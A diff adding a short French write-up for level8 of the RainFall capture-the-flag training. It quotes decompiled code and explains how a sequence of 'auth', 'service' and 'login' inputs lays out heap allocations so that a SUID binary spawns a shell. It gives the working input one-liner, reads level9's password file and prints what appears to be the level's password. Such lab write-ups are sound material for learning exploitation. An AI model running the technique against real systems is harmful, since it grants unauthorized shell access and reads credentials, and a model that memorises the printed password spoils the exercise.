@@ -2,4 +2,46 @@ Connextion au level8 -> Bit NX desactive
 Chech du home et des permissions du binaire -> Bit SUID level9
 Exection du binaire -> (nil), (nil)
 					puis attente d'entree standard et de nouveau
-					(nil), (nil)
+					(nil), (ni)
+
+Level assez simple a resoudre, la difficulte etant de traduire le code asm
+
+"""
+				if (*(p_auth + 32))
+					system("/bin/sh");
+"""
+
+Pour resoudre le niveau il faut pouvoir avoir un pointeur a 'p_auth+32' qui contienne quelque chose
+
+"""
+			if (!strncmp(area, auth, 5))
+			{
+				p_auth = malloc(4);
+"""
+
+Le programme permet de faire de nombreuses allocations, il faut dans un premier temps donne une adresse a 'p_auth' grace a la chaine "auth A" qui permet de rentrer dans le premier strncmp et alloue 4 octet a p_auth
+
+"""
+			if (!strncmp(area, service, 6) == 0)
+					p_service = strdup(area + 7);
+"""
+
+Il faut maintenant allouer de la donnee supplementaire jusqu'a atteindre l'adresse 'p_auth + 32'. Avec 2 chaines "service A" on peut atteindre cette adresse et lui donne une valeur
+
+"""
+			if (strncmp(area, login, 5))
+			{
+				if (*(p_auth + 32))
+					system("/bin/sh");
+"""
+
+Il faut maintenant utilise a la chaine "login" pour passer dans le if qui nous donnera l'acces au shell avec les droits level9
+
+
+level8@RainFall:~$ python -c 'print "auth A\n" + "service A\n"*2 + "login\n"' > /tmp/b ; cat /tmp/b - | ./level8
+(nil), (nil)
+0x804a008, (nil)
+0x804a008, 0x804a018
+0x804a008, 0x804a028
+cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
